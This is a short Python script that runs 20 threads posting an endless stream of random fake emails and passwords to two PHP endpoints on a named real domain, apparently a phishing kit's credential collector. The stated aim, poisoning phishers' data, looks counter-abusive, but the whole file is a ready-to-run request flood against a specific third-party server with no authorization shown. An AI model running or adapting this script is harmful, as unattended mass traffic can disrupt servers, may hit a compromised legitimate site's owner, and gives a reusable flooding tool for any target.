import random
import os
import string
import threading
import requests
from satella.coding.concurrent import TerminableThread, ThreadCollection
from satella.os import hang_until_sig


def rand_string(n):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(n))


class CounterTerroristsWin(TerminableThread):
    def loop(self):
        email = rand_string(random.randint(5, 15)) + '@' + rand_string(random.randint(5, 15)) + '.' + rand_string(2)
        password = rand_string(random.randint(10, 30))

        r = requests.post('http://www.pmodavao.com/regs/js/dt/crypt/pass.php', data={'email': email})

        if r.status_code == 200:
            r = requests.post('http://www.pmodavao.com/regs/js/dt/crypt/post.php',
                              data={'email': email, 'password': password})

            if r.status_code != 200:
                print('And when Im gone just carry on')


if __name__ == '__main__':
    q = ThreadCollection.from_class(CounterTerroristsWin, range(20))
    q.start()
    hang_until_sig()
    q.terminate().join()
